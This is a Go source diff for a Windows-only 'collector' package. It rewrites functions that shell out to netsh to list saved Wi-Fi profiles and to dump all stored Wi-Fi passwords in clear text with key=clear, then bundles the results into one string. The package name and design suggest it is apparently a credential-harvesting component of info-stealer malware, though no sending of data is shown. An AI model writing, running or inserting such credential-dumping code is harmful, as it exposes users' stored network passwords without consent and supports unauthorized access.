@@ -1,29 +1,33 @@
+//go:build windows
+
 package collector
 
 import (
 "os/exec"
+"strings"
 )
 
-type WiFiCollector struct{}
-
-func NewWiFiCollector() *WiFiCollector {
-return &WiFiCollector{}
-}
-
-func (w *WiFiCollector) GetPasswords() (string, error) {
-cmd := exec.Command("netsh", "wlan", "show", "profiles")
+func CollectWifiProfiles() string {
+cmd := exec.Command("cmd", "/c", "netsh wlan show profiles")
 output, err := cmd.Output()
 if err != nil {
-return "", err
+return "Error: " + err.Error()
 }
-return string(output), nil
+return strings.TrimSpace(string(output))
 }
 
-func (w *WiFiCollector) GetProfilePassword(profile string) (string, error) {
-cmd := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear")
+func CollectWifiPasswords() string {
+cmd := exec.Command("cmd", "/c", "netsh wlan show profile name=\"*\" key=clear")
 output, err := cmd.Output()
 if err != nil {
-return "", err
+return "Error: " + err.Error()
 }
-return string(output), nil
+return strings.TrimSpace(string(output))
+}
+
+func CollectWifiAll() string {
+var result strings.Builder
+result.WriteString(CollectWifiProfiles())
+result.WriteString(CollectWifiPasswords())
+return result.String()
 }
